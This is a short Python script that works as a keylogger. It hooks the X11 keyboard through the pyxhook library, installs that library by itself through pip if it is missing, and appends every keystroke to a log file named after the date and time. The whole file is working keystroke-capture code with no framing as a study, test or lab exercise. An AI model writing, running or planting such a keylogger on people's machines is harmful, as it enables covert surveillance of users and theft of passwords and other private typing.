import datetime
import subprocess

#check whether required package needs to be installed 
try:
    import pyxhook
except ImportError:
    subprocess.check_call(["python", '-m', 'pip', 'install', 'pyxhook'])
    import pyxhook

  

def KeyBoardEvent(event):

    #create new log file correspoding to the date and time
    file = open('log_%s' %currDT, 'a')

    key = event.Ascii #grab key

    if key >= 33 and key <=126:   #check if key is alphanumeric
        file.write('%s ' %event.Key)
    elif key == 32:  #check if key is 'space'
        file.write(' | ')
    else:    
        file.write('\n %s \n' %event.Key)



#Get date and time to name log file accordingl
currDT = datetime.datetime.now().strftime("%Y-%m-%d|%H:%M:%S")
hookman = pyxhook.HookManager()
hookman.KeyDown = KeyBoardEvent
hookman.HookKeyboard()
hookman.start()
    


    